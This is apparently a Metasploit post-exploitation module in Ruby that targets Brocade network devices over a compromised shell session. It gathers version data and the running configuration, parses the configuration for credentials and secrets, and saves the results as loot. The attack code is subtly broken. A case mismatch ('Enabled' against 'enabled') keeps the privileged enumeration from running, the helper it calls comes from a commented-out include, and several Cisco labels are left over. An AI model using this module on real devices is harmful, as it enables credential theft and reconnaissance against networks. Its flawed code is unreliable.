##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
#require 'msf/core/auxiliary/cisco'

class Metasploit3 < Msf::Post
  #include Msf::Auxiliary::Cisco
  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Brocade Gather Device General Information',
      'Description'   => %q{
        This module collects a Brocade device information and configuration.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'h00die <mike[at]shorebreaksecurity.com>'],
      'SessionTypes'  => [ 'shell' ]
    ))

    register_options(
      [
        OptString.new('ENABLE_UN', [false, 'Enable username for changing privilege level.']),
        OptString.new('ENABLE_PASS', [false, 'Enable password for changing privilege level.'])
      ], self.class)

  end

  def run
    # Get device prompt
    prompt = session.shell_command("")

    # Set terminal length to 0 so no paging is required
    #session.shell_write("term len 0 \n")

    # Get version info
    print_status("Getting version information")
    show_ver_cmd = "show version"
    ver_out = session.shell_command(show_ver_cmd)
    ver = ver_out.match(/SW: Version (?<ver_no>.*)\n/)
    #print_status(ver["ver_no"])
    


    # Get current privilege level
    #print_status("Getting privilege level")
    #priv_cmd = "show priv"
    #priv = (session.shell_command(priv_cmd)).scan(/privilege level is (\d*)/).join

    # Mark the OS
    os_type = "Brocade"
    os_loot = "brocade"
    case prompt
      when />/
        mode = "User Level"
      when /#/
        mode = "Enabled"
    end

    print_status("The device OS is #{os_type} version #{ver["ver_no"]}")
    #print_status("Session running in mode #{mode}")
    print_status("Privilege level #{mode}")

    ver_loc = store_loot("brocade.ios.version",
        "text/plain",
        session,
        ver["ver_no"].strip,
        "version.txt", #?
        "Brocade Version")
    # Print the version of VERBOSE set to true.
    vprint_status("version information stored in to loot, file:#{ver_loc}")

    # Enumerate depending priv level
    case mode
    when "enabled"
      enum_exec(prompt)
      enum_priv(prompt)
    end
  end

  # Run enumeration commands for when privilege level is 7 or 15
  def enum_priv(prompt)
    host,port = session.session_host, session.session_port
    priv_commands = [
      {
        "cmd"  => "show running-config",
        "fn"   => "run_config",
        "desc" => "Brocade Device running configuration"
      },
#      {
#        "cmd"  => "show cdp neigh",
#        "fn"   => "cdp_neighbors",
#        "desc" => "Cisco Device CDP Neighbors"
#      },
      {
        "cmd"  => "show lldp neighbors",
        "fn"   => "cdp_neighbors",
        "desc" => "Brocade Device LLDP Neighbors"
      }
    ]
    priv_commands.each do |ec|
      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/,"")
      next if cmd_out =~ /Invalid input|%/
      print_status("Gathering info from #{ec['cmd']}")
      # Process configuration
      if ec['cmd'] =~/show run/
        print_status("Parsing running configuration for credentials and secrets...")
        cisco_ios_config_eater(host,port,cmd_out)
      end
      cmd_loc = store_loot("cisco.ios.#{ec['fn']}",
        "text/plain",
        session,
        cmd_out.strip,
        "#{ec['fn']}.txt",
        ec['desc'])
      vprint_status("Saving to #{cmd_loc}")
    end
  end

  # run commands found in exec mode under privilege 1
  def enum_exec(prompt)
    exec_commands = [
      {
        "cmd"  => "show ssh",
        "fn"   => "ssh_sessions",
        "desc" => "SSH Sessions on Cisco Device"
      },
      {
        "cmd"  => "show sessions",
        "fn"   => "telnet_sessions",
        "desc" => "Telnet Sessions on Cisco Device"
      },
      {
        "cmd"  => "show login",
        "fn"   => "login_settings",
        "desc" => "Login settings on Cisco Device"
      },
      {
        "cmd"  => "show ip interface brief",
        "fn"   => "interface_info",
        "desc" => "IP Enabled Interfaces on Cisco Device"
      },
      {
        "cmd"  => "show inventory",
        "fn"   => "hw_inventory",
        "desc" => "Hardware component inventory for Cisco Device"
      }]
    exec_commands.each do |ec|
      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/,"")
      next if cmd_out =~ /Invalid input|%/
      print_status("Gathering info from #{ec['cmd']}")
      cmd_loc = store_loot("cisco.ios.#{ec['fn']}",
        "text/plain",
        session,
        cmd_out.strip,
        "#{ec['fn']}.txt",
        ec['desc'])
      vprint_status("Saving to #{cmd_loc}")
    end
  end
end
